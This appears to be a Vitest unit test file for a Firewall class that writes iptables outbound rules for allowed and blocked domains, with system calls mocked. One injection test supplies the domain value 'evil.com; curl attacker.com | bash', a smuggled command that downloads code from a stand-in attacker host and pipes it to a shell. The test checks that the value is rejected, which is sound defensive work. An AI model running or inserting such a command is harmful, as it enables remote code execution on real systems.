import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { Firewall, type NetworkPolicy } from './firewall.js';

// Mock child_process.execFileSync (not execSync — we use execFileSync for safety)
const execFileSyncMock = vi.fn().mockReturnValue('');
vi.mock('node:child_process', () => ({
  execFileSync: (...args: unknown[]) => execFileSyncMock(...args),
}));

/** Helper: extract [command, args] tuples from mock calls */
function getCalls(): Array<{ cmd: string; args: string[] }> {
  return execFileSyncMock.mock.calls.map((c: unknown[]) => ({
    cmd: c[0] as string,
    args: c[1] as string[],
  }));
}

function hasCall(cmd: string, args: string[]): boolean {
  return getCalls().some(
    (c) => c.cmd === cmd && JSON.stringify(c.args) === JSON.stringify(args),
  );
}

describe('Firewall', () => {
  let firewall: Firewall;

  beforeEach(() => {
    execFileSyncMock.mockReset();
    execFileSyncMock.mockReturnValue('');
    vi.spyOn(console, 'log').mockImplementation(() => {});
    vi.spyOn(console, 'warn').mockImplementation(() => {});
    vi.spyOn(console, 'error').mockImplementation(() => {});
    firewall = new Firewall('https://api.opensyber.cloud');
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('parses API host from base URL', () => {
    const fw = new Firewall('https://custom.example.com/api');
    expect(fw).toBeDefined();
  });

  it('falls back to default host on invalid URL', () => {
    const fw = new Firewall('not-a-url');
    expect(fw).toBeDefined();
  });

  describe('applyNetworkPolicy', () => {
    it('flushes existing rules first', async () => {
      const policy: NetworkPolicy = {
        allowedDomains: [],
        blockedDomains: [],
        allowApiOutbound: false,
      };
      await firewall.applyNetworkPolicy(policy);
      expect(hasCall('iptables', ['-F', 'OUTPUT'])).toBe(true);
    });

    it('always allows loopback and DNS', async () => {
      const policy: NetworkPolicy = {
        allowedDomains: [],
        blockedDomains: [],
        allowApiOutbound: false,
      };
      await firewall.applyNetworkPolicy(policy);

      expect(hasCall('iptables', ['-A', 'OUTPUT', '-p', 'all', '-d', '127.0.0.0/8', '-j', 'ACCEPT'])).toBe(true);
      expect(hasCall('iptables', ['-A', 'OUTPUT', '-p', 'udp', '--dport', '53', '-j', 'ACCEPT'])).toBe(true);
      expect(hasCall('iptables', ['-A', 'OUTPUT', '-p', 'tcp', '--dport', '53', '-j', 'ACCEPT'])).toBe(true);
    });

    it('sets default DROP policy', async () => {
      const policy: NetworkPolicy = {
        allowedDomains: [],
        blockedDomains: [],
        allowApiOutbound: false,
      };
      await firewall.applyNetworkPolicy(policy);
      expect(hasCall('iptables', ['-P', 'OUTPUT', 'DROP'])).toBe(true);
    });

    it('resolves and allows API domain when allowApiOutbound is true', async () => {
      execFileSyncMock.mockImplementation((cmd: string, args: string[]) => {
        if (cmd === 'getent' && args?.[0] === 'hosts') return '93.184.216.34  api.opensyber.cloud\n';
        return '';
      });

      const policy: NetworkPolicy = {
        allowedDomains: [],
        blockedDomains: [],
        allowApiOutbound: true,
      };
      await firewall.applyNetworkPolicy(policy);
      expect(hasCall('iptables', ['-A', 'OUTPUT', '-p', 'tcp', '-d', '93.184.216.34', '-j', 'ACCEPT'])).toBe(true);
    });

    it('resolves and allows custom domains', async () => {
      execFileSyncMock.mockImplementation((cmd: string, args: string[]) => {
        if (cmd === 'getent' && args?.[1] === 'example.com') return '93.184.216.34  example.com\n';
        return '';
      });

      const policy: NetworkPolicy = {
        allowedDomains: ['example.com'],
        blockedDomains: [],
        allowApiOutbound: false,
      };
      await firewall.applyNetworkPolicy(policy);
      expect(hasCall('iptables', ['-A', 'OUTPUT', '-p', 'tcp', '-d', '93.184.216.34', '-j', 'ACCEPT'])).toBe(true);
    });

    it('adds DROP rules for blocked domains', async () => {
      execFileSyncMock.mockImplementation((cmd: string, args: string[]) => {
        if (cmd === 'getent' && args?.[1] === 'evil.com') return '6.6.6.6  evil.com\n';
        return '';
      });

      const policy: NetworkPolicy = {
        allowedDomains: [],
        blockedDomains: ['evil.com'],
        allowApiOutbound: false,
      };
      await firewall.applyNetworkPolicy(policy);
      expect(hasCall('iptables', ['-A', 'OUTPUT', '-p', 'all', '-d', '6.6.6.6', '-j', 'DROP'])).toBe(true);
    });

    it('rejects domains with shell injection characters', async () => {
      const policy: NetworkPolicy = {
        allowedDomains: ['evil.com; curl attacker.com | bash'],
        blockedDomains: [],
        allowApiOutbound: false,
      };
      await firewall.applyNetworkPolicy(policy);
      // Should NOT call getent for the malicious domain
      const getentCalls = getCalls().filter((c) => c.cmd === 'getent');
      expect(getentCalls).toHaveLength(0);
    });
  });

  describe('blockAll', () => {
    it('flushes rules, allows loopback, drops all', () => {
      firewall.blockAll();
      expect(hasCall('iptables', ['-F', 'OUTPUT'])).toBe(true);
      expect(hasCall('iptables', ['-A', 'OUTPUT', '-p', 'all', '-d', '127.0.0.0/8', '-j', 'ACCEPT'])).toBe(true);
      expect(hasCall('iptables', ['-P', 'OUTPUT', 'DROP'])).toBe(true);
    });
  });

  describe('getActiveRules', () => {
    it('returns empty list initially', () => {
      expect(firewall.getActiveRules()).toEqual([]);
    });

    it('returns rules after blockAll', () => {
      firewall.blockAll();
      const rules = firewall.getActiveRules();
      expect(rules).toHaveLength(1);
      expect(rules[0]).toEqual({
        chain: 'OUTPUT',
        target: 'ACCEPT',
        protocol: 'all',
        destination: '127.0.0.0/8',
      });
    });
  });

  describe('allowDomains', () => {
    it('handles DNS resolution failure gracefully', async () => {
      execFileSyncMock.mockImplementation(() => {
        throw new Error('DNS failed');
      });
      await firewall.allowDomains(['nonexistent.example.com']);
      expect(firewall.getActiveRules()).toEqual([]);
    });
  });

  describe('exec error handling', () => {
    it('handles iptables command failures gracefully', async () => {
      execFileSyncMock.mockImplementation(() => {
        throw new Error('iptables not found');
      });
      firewall.blockAll();
      expect(firewall.getActiveRules()).toHaveLength(1);
    });
  });
});
